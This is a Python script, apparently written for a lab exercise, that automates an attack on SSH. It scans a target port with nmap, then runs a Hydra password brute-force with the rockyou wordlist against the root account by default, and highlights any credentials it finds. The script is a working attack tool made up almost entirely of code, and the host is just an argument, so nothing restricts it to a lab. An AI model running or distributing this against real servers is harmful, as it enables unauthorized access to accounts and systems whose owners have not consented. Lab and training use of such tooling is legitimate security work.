#!/usr/bin/env python3

import argparse
import shutil
import subprocess
import sys


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run an SSH reconnaissance + Hydra brute-force lab workflow."
    )
    parser.add_argument("--target", default="target_ssh", help="SSH target hostname/IP")
    parser.add_argument("--port", type=int, default=22, help="SSH target port")
    parser.add_argument("--username", default="root", help="Username to brute-force")
    parser.add_argument(
        "--wordlist",
        default="/usr/share/wordlists/rockyou.txt",
        help="Path to password wordlist",
    )
    parser.add_argument(
        "--skip-scan",
        action="store_true",
        help="Skip nmap scan and run hydra directly",
    )
    return parser.parse_args()


def require_tool(tool_name: str) -> None:
    if shutil.which(tool_name) is None:
        print(f"[-] Required tool not found in PATH: {tool_name}")
        sys.exit(1)


def run_command(command: list[str], step_name: str) -> None:
    print(f"[*] {step_name}")
    result = subprocess.run(command, check=False)
    if result.returncode != 0:
        print(f"[-] {step_name} failed with exit code {result.returncode}")
        sys.exit(result.returncode)


def run_hydra(command: list[str], step_name: str, output: list[str]) -> int:
    """Run Hydra and capture output. Returns 0 if any credentials were found."""
    print(f"[*] {step_name}")
    result = subprocess.run(command, check=False, capture_output=False, text=False)
    output.append(str(result.returncode))
    # Hydra exit codes: 0 = found, 1 = not found, 255 = partial errors but may still have found creds
    # We check stdout for the success marker instead of relying solely on exit code
    return result.returncode


def main() -> None:
    args = parse_args()
    require_tool("hydra")

    if not args.skip_scan:
        require_tool("nmap")
        run_command(
            ["nmap", "-p", str(args.port), args.target],
            f"Scanning {args.target}:{args.port} with nmap",
        )

    GREEN = "\033[32;1m"
    RESET = "\033[0m"
    SUCCESS_MARKER = f"[{args.port}][ssh] host:"

    print("[*] Launching Hydra brute-force attack")
    hydra_cmd = [
        "hydra",
        "-l", args.username,
        "-P", args.wordlist,
        "-s", str(args.port),
        f"ssh://{args.target}",
    ]

    process = subprocess.Popen(
        hydra_cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    found = False
    assert process.stdout is not None
    for line in process.stdout:
        if SUCCESS_MARKER in line:
            sys.stdout.write(f"{GREEN}{line}{RESET}")
            found = True
        elif found and (line.startswith("[ERROR]") or line.startswith("[WARNING]")):
            # Suppress Hydra cleanup noise after credentials are found
            continue
        else:
            sys.stdout.write(line)
        sys.stdout.flush()

    rc = process.wait()

    if found:
        print(f"\n{GREEN}[+] Hydra brute-force attack succeeded — valid credentials found!{RESET}")
        print("[+] Workflow finished")
        sys.exit(0)
    elif rc == 0:
        print("[+] Workflow finished")
        sys.exit(0)
    else:
        print(f"[-] Launching Hydra brute-force attack failed with exit code {rc}")
        sys.exit(rc)


if __name__ == "__main__":
    main()